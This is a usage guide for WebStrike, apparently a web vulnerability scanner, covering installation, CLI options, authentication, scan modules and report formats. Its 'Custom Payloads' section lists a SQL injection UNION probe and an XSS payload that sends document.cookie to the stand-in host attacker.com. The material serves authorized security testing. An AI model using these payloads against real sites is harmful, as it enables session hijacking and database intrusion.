# WebStrike Installation and Usage Guide

## 🚀 Quick Start

### Installation

1. **Clone or download WebStrike**
   ```bash
   cd webstrike
   ```

2. **Install Python dependencies**
   ```bash
   pip install -r requirements.txt
   ```

3. **Install additional tools (for PDF reports)**
   ```bash
   # For PDF generation (optional)
   # Windows: Download wkhtmltopdf from https://wkhtmltopdf.org/downloads.html
   # Linux: sudo apt-get install wkhtmltopdf
   # macOS: brew install wkhtmltopdf
   ```

4. **Test installation**
   ```bash
   python -m cli.webstrike_cli info
   ```

### Basic Usage

**Run a basic scan:**
```bash
python -m cli.webstrike_cli scan -u https://example.com
```

**Scan with specific modules:**
```bash
python -m cli.webstrike_cli scan -u https://example.com -m sqli,xss
```

**Generate HTML report:**
```bash
python -m cli.webstrike_cli scan -u https://example.com -f html
```

**Scan with authentication:**
```bash
python -m cli.webstrike_cli scan -u https://example.com --auth-type form --login-url /login --username admin --password secret
```

## 📋 Detailed Usage

### Command Line Options

```
webstrike scan [OPTIONS]

Options:
  -u, --url TEXT              Target URL to scan [required]
  -m, --modules TEXT          Modules: sqli,xss,csrf,headers,file_upload or "all"
  -d, --depth INTEGER         Maximum crawling depth (default: 3)
  --max-urls INTEGER          Maximum URLs to crawl (default: 100)
  -t, --threads INTEGER       Number of threads (default: 5)
  --delay FLOAT               Delay between requests in seconds (default: 1.0)
  -o, --output TEXT           Output file prefix
  -f, --format [json|html|pdf] Output format (default: json)
  --auth-type [none|form|bearer|api_key|cookies] Authentication type
  --login-url TEXT            Login URL for form authentication
  --username TEXT             Username for form authentication
  --password TEXT             Password for form authentication
  --token TEXT                Bearer token or API key
  --header-name TEXT          Header name for API key (default: Authorization)
  --cookies TEXT              Cookies as JSON string
  --proxy TEXT                Proxy URL (http://proxy:port)
  --headers TEXT              Custom headers as JSON string
  -v, --verbose               Verbose output
```

### Authentication Examples

**Form-based authentication:**
```bash
python -m cli.webstrike_cli scan -u https://example.com \
  --auth-type form \
  --login-url https://example.com/login \
  --username admin \
  --password password123
```

**Bearer token authentication:**
```bash
python -m cli.webstrike_cli scan -u https://api.example.com \
  --auth-type bearer \
  --token "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

**API key authentication:**
```bash
python -m cli.webstrike_cli scan -u https://api.example.com \
  --auth-type api_key \
  --token "your-api-key-here" \
  --header-name "X-API-Key"
```

**Cookie-based authentication:**
```bash
python -m cli.webstrike_cli scan -u https://example.com \
  --auth-type cookies \
  --cookies '{"session_id": "abc123", "user_token": "xyz789"}'
```

### Advanced Usage

**Using proxy:**
```bash
python -m cli.webstrike_cli scan -u https://example.com \
  --proxy http://127.0.0.1:8080
```

**Custom headers:**
```bash
python -m cli.webstrike_cli scan -u https://example.com \
  --headers '{"User-Agent": "Custom Agent", "X-Forwarded-For": "127.0.0.1"}'
```

**High-intensity scan:**
```bash
python -m cli.webstrike_cli scan -u https://example.com \
  --depth 5 \
  --max-urls 500 \
  --threads 10 \
  --delay 0.5
```

**Generate PDF report:**
```bash
python -m cli.webstrike_cli scan -u https://example.com -f pdf
```

## 🔧 Modules

### SQL Injection (sqli)
- **Error-based detection**: Identifies database errors in responses
- **Boolean-based detection**: Tests logic-based injection points
- **Time-based detection**: Uses timing attacks for blind SQLi
- **Supports**: MySQL, PostgreSQL, MSSQL, Oracle, SQLite

### Cross-Site Scripting (xss)
- **Reflected XSS**: Tests for immediate reflection of payloads
- **DOM-based XSS**: Analyzes JavaScript for dangerous patterns
- **Context analysis**: Determines if reflection occurs in dangerous contexts
- **Payload variations**: Multiple encoding and bypass techniques

### CSRF (csrf)
- **Token analysis**: Checks for presence and quality of CSRF tokens
- **SameSite cookies**: Validates cookie security attributes
- **Form testing**: Attempts to submit forms without proper tokens
- **POC generation**: Creates proof-of-concept attack files

### Security Headers (headers)
- **HSTS analysis**: HTTP Strict Transport Security validation
- **CSP evaluation**: Content Security Policy assessment
- **Cookie security**: Secure, HttpOnly, SameSite attribute checks
- **Information disclosure**: Identifies verbose server headers

### File Upload (file_upload)
- **Extension bypass**: Tests various file extension bypass techniques
- **MIME type bypass**: Attempts to upload dangerous files with safe MIME types
- **Size restrictions**: Tests file size limitation bypass
- **Path traversal**: Checks for directory traversal in uploads

## 📊 Report Formats

### JSON Report
- Complete machine-readable scan results
- Detailed vulnerability information
- Suitable for automation and integration

### HTML Report
- Human-readable web-based report
- Executive summary with risk scores
- Detailed findings with recommendations
- Responsive design for mobile viewing

### PDF Report
- Professional document format
- Executive summary and technical details
- Suitable for compliance and reporting
- Requires wkhtmltopdf installation

## 🛡️ Security Considerations

### Legal Usage
- **Only test systems you own or have explicit permission to test**
- Unauthorized testing is illegal and unethical
- Follow responsible disclosure practices
- Respect rate limits and terms of service

### Rate Limiting
- Use appropriate delays between requests
- Monitor target system performance
- Implement exponential backoff for errors
- Consider time-based testing windows

### Data Handling
- Scan results may contain sensitive information
- Store reports securely
- Implement proper access controls
- Follow data retention policies

## 🔍 Troubleshooting

### Common Issues

**Import errors:**
```bash
# Install missing dependencies
pip install -r requirements.txt
```

**PDF generation fails:**
```bash
# Install wkhtmltopdf
# Windows: Download from https://wkhtmltopdf.org/downloads.html
# Linux: sudo apt-get install wkhtmltopdf
# macOS: brew install wkhtmltopdf
```

**Authentication failures:**
```bash
# Test authentication separately
python -m cli.webstrike_cli test-auth -u https://example.com --auth-type form --login-url /login --username admin --password secret
```

**Crawling issues:**
- Check target URL accessibility
- Verify network connectivity
- Test with lower depth and URL limits
- Check for WAF blocking

**Performance issues:**
- Reduce thread count
- Increase delay between requests
- Limit crawling depth and URLs
- Use targeted module selection

### Debug Mode

Enable verbose logging for troubleshooting:
```bash
python -m cli.webstrike_cli scan -u https://example.com -v
```

## 🔧 Configuration

Edit `config.ini` to customize default behavior:

```ini
[scanning]
max_depth = 3
max_urls = 100
request_delay = 1.0
threads = 5

[modules]
sqli = true
xss = true
csrf = true
headers = true
file_upload = true
```

## 🤝 Contributing

### Adding New Modules

1. Create new module in `engine/modules/`
2. Implement scanner class with required methods
3. Add module to main scanner initialization
4. Update CLI options and documentation
5. Add comprehensive test cases

### Custom Payloads

Add custom payloads to `engine/payloads/custom.txt`:
```
# Custom SQLi payload
' UNION SELECT @@version--

# Custom XSS payload
<img src=x onerror=fetch('//attacker.com/'+document.cookie)>
```

## 📚 API Reference

### Scanner Class

```python
from engine.scanner import WebStrikeScanner

# Initialize scanner
scanner = WebStrikeScanner("https://example.com", config={
    'max_depth': 3,
    'modules': ['sqli', 'xss']
})

# Setup authentication
scanner.setup_authentication({
    'type': 'bearer',
    'token': 'your-token-here'
})

# Run scan
import asyncio
results = asyncio.run(scanner.run_full_scan())

# Generate report
from reports.report_generator import ReportGenerator
generator = ReportGenerator()
generator.generate_html_report(results)
```

## 📖 Examples

See the `examples/` directory for:
- Custom module development
- Integration scripts
- Advanced configuration
- Automation examples

## 🆘 Support

For issues and questions:
1. Check this documentation
2. Review error logs with `-v` flag
3. Check GitHub issues
4. Create detailed bug reports

---

**⚠️ Disclaimer**: WebStrike is for authorized security testing only. Users are responsible for compliance with applicable laws and regulations.
